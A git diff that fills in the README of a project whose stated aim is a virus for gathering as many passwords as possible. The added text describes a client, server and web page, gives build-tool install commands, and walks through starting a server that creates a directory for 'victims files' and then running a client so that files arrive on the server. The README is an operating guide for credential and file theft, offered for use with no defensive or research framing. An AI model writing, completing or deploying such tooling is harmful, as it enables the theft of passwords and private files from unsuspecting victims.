@@ -4,21 +4,49 @@ The goal of this project is to create a virus capable of gathering as much passw
 
 ## How does it work?
 
-[Explain how this project is working]
+This projet work in three step :
+    - The client
+    - The server
+    - The page web
 
 ## Getting Started
 
 ### Installation
 
-[Explain how to install all of the project's dependencies]
-
-### Quickstart
-
-[Explain how to run this project]
+make :
+```
+sudo apt-get install build-essential
+```
+cpp : 
+```
+sudo apt install g++
+sudo apt install build-essential
+```
 
 ### Usage
 
-[Explain how to use this project]
+To start the projet, you need first to start the server :
+```bash
+cd ./server
+make
+./server
+```
+
+Now your server will listening and waiting some data :
+```
+Socket successfully created...
+Created a directory to store the victims files
+Wait new client...
+```
+After that the server in running you can start the client :
+```bash
+cd ./client
+make
+./client
+```
+
+And you will get some files on the server after that.
+
 
 ## Get involved
 
